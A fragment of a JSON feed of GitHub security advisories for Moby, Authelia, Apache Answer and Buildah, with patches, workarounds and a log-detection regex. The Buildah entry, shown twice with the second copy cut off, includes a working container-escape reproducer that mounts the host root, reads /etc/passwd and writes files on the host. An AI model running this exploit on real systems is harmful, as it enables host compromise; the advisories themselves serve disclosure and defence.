            "date_modified": "2024-04-22T18:45:22.000Z",
            "date_published": "2024-04-22T18:45:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2mm7-x5h6-5pvq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A bug was found in Moby (Docker Engine) where containers were incorrectly started with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during <code>execve(2)</code>.  Normally, when executable programs have specified permitted file capabilities, otherwise unprivileged users and processes can execute those programs and gain the specified file capabilities up to the bounding set.  Due to this bug, containers which included executable programs with inheritable file capabilities allowed otherwise unprivileged users and processes to additionally gain these inheritable file capabilities up to the container's bounding set.  Containers which use Linux users and groups to perform privilege separation inside the container are most directly impacted.</p>\n<p>This bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This bug has been fixed in Moby (Docker Engine) 20.10.14.  Users should update to this version as soon as possible.  Running containers should be stopped, deleted, and recreated for the inheritable capabilities to be reset.</p>\n<p>This fix changes Moby (Docker Engine) behavior such that containers are started with a more typical Linux environment.  Refer to <code>capabilities(7)</code> for a description of how capabilities work.  Note that permitted file capabilities continue to allow for privileges to be raised up to the container's bounding set and that processes may add capabilities to their own inheritable set up to the container's bounding set per the rules described in the manual page.  In all cases the container's bounding set provides an upper bound on the capabilities that can be assumed and provides for the container security sandbox.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The entrypoint of a container can be modified to use a utility like <code>capsh(1)</code> to drop inheritable capabilities prior to the primary process starting.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The Moby project would like to thank <a href=\"https://github.com/AndrewGMorgan\">Andrew G. Morgan</a> for responsibly disclosing this issue in accordance with the <a href=\"https://github.com/moby/moby/blob/master/SECURITY.md\">Moby security policy</a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/moby/moby/issues/new\">Open an issue</a></li>\n<li>Email us at <a href=\"mailto:security@docker.com\">security@docker.com</a> if you think you’ve found a security bug</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/security/advisories/GHSA-2mm7-x5h6-5pvq\">https://github.com/moby/moby/security/advisories/GHSA-2mm7-x5h6-5pvq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24769\">https://nvd.nist.gov/vuln/detail/CVE-2022-24769</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/2bbc786e4c59761d722d2d1518cd0a32829bc07f\">https://github.com/moby/moby/commit/2bbc786e4c59761d722d2d1518cd0a32829bc07f</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/7f375bcff41ce672cd61e9a31f3eeb2966e3dbe1\">https://github.com/moby/moby/commit/7f375bcff41ce672cd61e9a31f3eeb2966e3dbe1</a></li>\n<li><a href=\"https://www.debian.org/security/2022/dsa-5162\">https://www.debian.org/security/2022/dsa-5162</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/202401-31\">https://security.gentoo.org/glsa/202401-31</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC</a></li>\n<li><a href=\"https://github.com/moby/moby/releases/tag/v20.10.14\">https://github.com/moby/moby/releases/tag/v20.10.14</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/05/12/1\">http://www.openwall.com/lists/oss-security/2022/05/12/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2mm7-x5h6-5pvq\">https://github.com/advisories/GHSA-2mm7-x5h6-5pvq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2mm7-x5h6-5pvq",
            "title": "[github.com/moby/moby] Moby (Docker Engine) started with non-empty inheritable Linux process capabilities",
            "date_modified": "2024-04-22T18:45:22.000Z",
            "date_published": "2024-04-22T18:45:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2mm7-x5h6-5pvq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Under very specific conditions changes to a users groups may not have the expected results.</p>\n<p>The specific conditions are:</p>\n<ul>\n<li>The file authentication backend is being used.</li>\n<li>The <a href=\"https://www.authelia.com/configuration/first-factor/file/#watch\">watch</a> option is set to true.</li>\n<li>The <a href=\"https://www.authelia.com/configuration/first-factor/introduction/#refresh_interval\">refresh_interval</a> is configured to a non-disabled value.</li>\n<li>The users groups are adjusted by an administrator.</li>\n<li>The user attempts to access a resource that their groups previously had access to but their new groups do not have access to.</li>\n</ul>\n<p>When these conditions are met administrators may find the changes are not taken into account by access control for longer than expected periods. While this may not necessarily be a security vulnerability it's security-adjacent and because of the unexpected nature of it and our dedication to a security-first culture we feel it's important to make users aware of this behaviour utilizing a security advisory and the existence of a fix.</p>\n<p>This:</p>\n<ul>\n<li>Can not have an Impact for Unauthenticated Users.</li>\n<li>Can not have an Impact for Configurations utilizing the LDAP Backend.</li>\n<li>Can not be directly or indirectly caused by a users or third parties actions.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>This behaviour was identified <strong><em>after</em></strong> it was inadvertently fixed in the <code>master</code> branch during the multi-cookie domain rework (i.e. between feature releases). A patch for prior versions can be provided upon request. The fix was to ensure the details are updated regardless of backend, it was a small oversight in previous functionality which made refreshing ineffectual prior to v4.37.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure you restart between user database changes.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/authelia/authelia/blob/v4.37.5/internal/handlers/handler_verify.go#L376-L394\">https://github.com/authelia/authelia/blob/v4.37.5/internal/handlers/handler_verify.go#L376-L394</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/authelia/authelia/security/advisories/GHSA-x883-2vmg-xwf7\">https://github.com/authelia/authelia/security/advisories/GHSA-x883-2vmg-xwf7</a></li>\n<li><a href=\"https://github.com/authelia/authelia/blob/v4.37.5/internal/handlers/handler_verify.go#L376-L394\">https://github.com/authelia/authelia/blob/v4.37.5/internal/handlers/handler_verify.go#L376-L394</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x883-2vmg-xwf7\">https://github.com/advisories/GHSA-x883-2vmg-xwf7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x883-2vmg-xwf7",
            "title": "[github.com/authelia/authelia/v4] Authelia's Group Changes may not have the expected results (YAML file backend)",
            "date_modified": "2024-04-22T15:52:42.000Z",
            "date_published": "2024-04-22T15:52:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x883-2vmg-xwf7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'/<code>XSS</code>) vulnerability in Apache Answer.This issue affects Apache Answer: before 1.3.0.</p>\n<p>XSS attack when user changes personal website. A logged-in user, when modifying their personal website, can input malicious code in the website to create such an attack.\nUsers are recommended to upgrade to version [1.3.0], which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29217\">https://nvd.nist.gov/vuln/detail/CVE-2024-29217</a></li>\n<li><a href=\"https://lists.apache.org/thread/nc0g1borr0d3wx25jm39pn7nyf268n0x\">https://lists.apache.org/thread/nc0g1borr0d3wx25jm39pn7nyf268n0x</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cvqr-mwh6-2vc6\">https://github.com/advisories/GHSA-cvqr-mwh6-2vc6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cvqr-mwh6-2vc6",
            "title": "[github.com/apache/incubator-answer] Apache Answer: XSS vulnerability when changing personal website",
            "date_modified": "2024-04-22T15:52:28.000Z",
            "date_published": "2024-04-21T18:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cvqr-mwh6-2vc6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This affects uses who are using nginx ngx_http_auth_request_module with Authelia, it allows a malicious individual who crafts a malformed HTTP request to bypass the authentication mechanism. It additionally could theoretically affect other proxy servers, but all of the ones we officially support except nginx do not allow malformed URI paths.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem is rectified entirely in v4.29.3. As this patch is relatively straightforward we can back port this to any version upon request. Alternatively we are supplying a git patch to 4.25.1 which should be relatively straightforward to apply to any version, the git patches for specific versions can be found below.</p>\n<details><summary>Patch for 4.25.1:</summary><p>\n\n</p><pre><code class=\"language-patch\">From ca22f3d2c44ca7bef043ffbeeb06d6659c1d550f Mon Sep 17 00:00:00 2001\nFrom: James Elliott &lt;james-d-elliott@users.noreply.github.com&gt;\nDate: Wed, 19 May 2021 12:10:13 +1000\nSubject: [PATCH] fix(handlers): verify returns 200 on malformed request\n\nThis is a git patch for commit at tag v4.25.1 to address a potential method to bypass authentication in proxies that forward malformed information to Authelia in the forward auth process. Instead of returning a 200 this ensures that Authelia returns a 401 when this occurs.\n---\n internal/handlers/handler_verify.go | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\ndiff --git a/internal/handlers/handler_verify.go b/internal/handlers/handler_verify.go\nindex 65c064ce..4dd9702d 100644\n--- a/internal/handlers/handler_verify.go\n+++ b/internal/handlers/handler_verify.go\n@@ -396,7 +396,9 @@ func VerifyGet(cfg schema.AuthenticationBackendConfiguration) middlewares.Reques\n         targetURL, err := getOriginalURL(ctx)\n \n         if err != nil {\n-\t\t\tctx.Error(fmt.Errorf(\"Unable to parse target URL: %s\", err), operationFailedMessage)\n+\t\t\tctx.Logger.Error(fmt.Errorf(\"Unable to parse target URL: %s\", err))\n+\t\t\tctx.ReplyUnauthorized()\n+\n             return\n         }\n \n-- \n2.31.1\n</code></pre>\n<p></p></details>\n\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The most relevant workaround is upgrading. <strong>If you need assistance with an upgrade please contact us on <a href=\"https://riot.im/app/#/room/#authelia:matrix.org\">Matrix</a> or <a href=\"https://discord.authelia.com\">Discord</a>.</strong> Please just let us know you're needing help upgrading to above 4.29.2. </p>\n<p>You can add an block which fails requests that contains a malformed URI in the internal location block. We have crafted one that should work in most instances, it basically checks no chars that are required to be URL-encoded for either the path or the query are in the URI. Basically this regex checks that the characters between the square braces are the only characters in the $request_uri header, if they exist, it returns a HTTP 401 status code. The characters in the regex match are tested to not cause a parsing error that would result in a failure, however they are not exhaustive since query strings seem to not always conform to the RFC.</p>\n<details><summary>authelia.conf:</summary><p>\n\n</p><pre><code class=\"language-nginx\">location /authelia {\n    internal;\n    # **IMPORTANT**\n    # This block rejects requests with a 401 which contain characters that are unable to be parsed.\n    # It is necessary for security prior to v4.29.3 due to the fact we returned an invalid code in the event of a parser error.\n    # You may comment this section if you're using Authelia v4.29.3 or above. We strongly recommend upgrading.\n    # RFC3986: http://tools.ietf.org/html/rfc3986\n    # Commentary on RFC regarding Query Strings: https://www.456bereastreet.com/archive/201008/what_characters_are_allowed_unencoded_in_query_strings/\n    if ($request_uri ~ [^a-zA-Z0-9_+-=\\!@$%&amp;*?~.:#'\\;\\(\\)\\[\\]]) {\n        return 401;\n    }\n\n    # Include the remainder of the block here. \n}\n</code></pre>\n<p></p></details>\n\n<h3 id=\"discovery\">Discovery</h3>\n<p>This issue was discovered by:</p>\n<p>Siemens Energy\nCybersecurity Red Team</p>\n<ul>\n<li>Silas Francisco</li>\n<li>Ricardo Pesqueira</li>\n</ul>\n<h3 id=\"identifying-active-exploitation-of-the-vulnerability\">Identifying active exploitation of the vulnerability</h3>\n<p>The following regex should match log entries that are an indication of the vulnerability being exploited:</p>\n<pre><code class=\"language-regex\">level=error msg=\"Unable to parse target URL: Unable to parse URL (extracted from X-Original-URL header)?.*?: parse.*?net/url:.*github\\.com/authelia/authelia/internal/handlers/handler_verify\\.go\n</code></pre>\n<p>Example log entry <em><strong>with</strong></em> X-Original-URL configured:</p>\n<pre><code class=\"language-log\">time=\"2021-05-21T16:31:15+10:00\" level=error msg=\"Unable to parse target URL: Unable to parse URL extracted from X-Original-URL header: parse \\\"https://example.com/\": net/url: invalid control character in URL\" method=GET path=/api/verify remote_ip=192.168.1.10 stack=\"github.com/authelia/authelia/internal/middlewares/authelia_context.go:65 (*AutheliaCtx).Error\\ngithub.com/authelia/authelia/internal/handlers/handler_verify.go:431     VerifyGet.func1\\ngithub.com/authelia/authelia/internal/middlewares/authelia_context.go:50 AutheliaMiddleware.func1.1\\ngithub.com/fasthttp/router@v1.3.12/router.go:414                         (*Router).Handler\\ngithub.com/authelia/authelia/internal/middlewares/log_request.go:14      LogRequestMiddleware.func1\\ngithub.com/valyala/fasthttp@v1.24.0/server.go:2219                       (*Server).serveConn\\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:223                    (*workerPool).workerFunc\\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:195                    (*workerPool).getCh.func1\\nruntime/asm_amd64.s:1371                                                 goexit\"\n</code></pre>\n<p>Example log entry <em><strong>without</strong></em> X-Original-URL configured:</p>\n<pre><code class=\"language-log\">time=\"2021-05-21T16:30:17+10:00\" level=error msg=\"Unable to parse target URL: Unable to parse URL https://example.com/: parse \\\"https://example.com/\": net/url: invalid control character in URL\" method=GET path=/api/verify remote_ip=192.168.1.10 stack=\"github.com/authelia/authelia/internal/middlewares/authelia_context.go:65 (*AutheliaCtx).Error\\ngithub.com/authelia/authelia/internal/handlers/handler_verify.go:431     VerifyGet.func1\\ngithub.com/authelia/authelia/internal/middlewares/authelia_context.go:50 AutheliaMiddleware.func1.1\\ngithub.com/fasthttp/router@v1.3.12/router.go:414                         (*Router).Handler\\ngithub.com/authelia/authelia/internal/middlewares/log_request.go:14      LogRequestMiddleware.func1\\ngithub.com/valyala/fasthttp@v1.24.0/server.go:2219                       (*Server).serveConn\\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:223                    (*workerPool).workerFunc\\ngithub.com/valyala/fasthttp@v1.24.0/workerpool.go:195                    (*workerPool).getCh.func1\\nruntime/asm_amd64.s:1371                                                 goexit\"\n</code></pre>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open a <a href=\"https://github.com/authelia/authelia/discussions\">Discussion</a></li>\n<li>Email us at <a href=\"mailto:security@authelia.com\">security@authelia.com</a></li>\n</ul>\n<h3 id=\"edit--adjustment\">Edit / Adjustment</h3>\n<p>This CVE has been edited adjusting the score to more accurately reflect the guidance in the <a href=\"https://www.first.org/cvss/specification-document\">official CVSS 3.1 guide</a>. Due to misunderstandings about the CVSS indicators this was incorrectly assigned but this has been corrected. Under close evaluation the score we originally assigned to this CVE is inappropriate in two clearly identifiable criteria:</p>\n<ul>\n<li>Complexity (Low -&gt; High): This attack requires the administrator be using NGINX's auth_request module. This means the attack cannot be exploited at will but rather requires a pre-condition separate to the vulnerable system outside of the attackers control (a vulnerable version of NGINX - at the time of this writing NGINX's security team has <em>refused</em> to fix the clear bug on their end but that's effectively irrelevant since we operate with more than just a NGINX proxy and no other proxy has this vulnerability), and requires the attacker have gathered knowledge about the system for this likely to be exploited.</li>\n<li>Availability (High -&gt; None): This attack does not alter availability directly.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/authelia/authelia/security/advisories/GHSA-68wm-pfjf-wqp6\">https://github.com/authelia/authelia/security/advisories/GHSA-68wm-pfjf-wqp6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-32637\">https://nvd.nist.gov/vuln/detail/CVE-2021-32637</a></li>\n<li><a href=\"https://github.com/authelia/authelia/commit/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda\">https://github.com/authelia/authelia/commit/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-68wm-pfjf-wqp6\">https://github.com/advisories/GHSA-68wm-pfjf-wqp6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-68wm-pfjf-wqp6",
            "title": "[github.com/authelia/authelia/v4] Authelia vulnerable to an authentication bypassed with malformed request URI on nginx",
            "date_modified": "2024-04-22T14:49:50.000Z",
            "date_published": "2021-12-20T16:57:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-68wm-pfjf-wqp6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm 